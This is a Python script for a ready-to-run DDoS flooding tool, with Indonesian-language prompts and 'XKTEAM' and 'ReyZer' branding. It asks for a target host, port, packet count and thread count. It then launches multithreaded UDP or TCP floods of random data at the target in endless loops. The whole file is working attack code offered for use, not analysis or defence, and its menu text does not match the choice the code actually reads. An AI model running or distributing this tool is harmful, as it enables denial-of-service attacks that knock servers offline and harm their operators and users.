
#C0DE BY XKTEAM
import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

os.system("clear")
os.system("figlet DDOS ATTACK -f slant")
os.system("clear")
print("===> Ramake By : ReyZer <===")
print("##  PENGGUNAAN DDOS KETIK 1 BUAT UDP KETIK 2 BUAT TCP  ##")
print("######################################################### ")
print("#LEBIH JELASNYA KETIK Python-UDP-Flood Python-TCP-Flood # ")
print("######################################################### ")
test = input()
if test == "n":
	exit(0)
ip = str(input("===> HOST/IP TARGET:"))
port = int(input("===> PORT TARGET:"))
choice = str(input("===> KUY DDOS SERVERNYA?(y/n):"))
times = int(input("===> PACKETS DDOS:"))
threads = int(input("===> THREADS DDOS:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[%]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Xk Team ATTACK FROM SERVER!!!")
		except:
			s.close()
			print("DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[%]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Xk Team ATTACK FROM SERVER!!!")
		except:
			s.close()
			print("DOWN!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

def new():
	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target = run)
			th.start()
		else:
			th = threading.Thread(target = run2)
			th.start()

def whereuwere():
    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
    print("Put 1 for UDP and 2 for TCP")
    whereman = str(input(" 1 or 2 >:("))
    if whereman == '1':
        run()
    else:
        run2()

def clear():
	# for windows
    if name == 'nt':
        _ = system('cls')

    # for mac and linux(here, os.name is 'posix')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet Youre Leaving Sir -f slant")
	sys.exit(130)

def exit_gracefully(signum, frame):
    # restore the original signal handler as otherwise evil things will happen
    # in raw_input when CTRL+C is pressed, and our signal handler is not re-entrant
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" Ngapain Close Lagi Lah <3 ?:"))
        if exitc == 'y':

            byebye()

    except KeyboardInterrupt:
        print("Ok ok, quitting")
        byebye()

    # restore the exit gracefully handler here
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)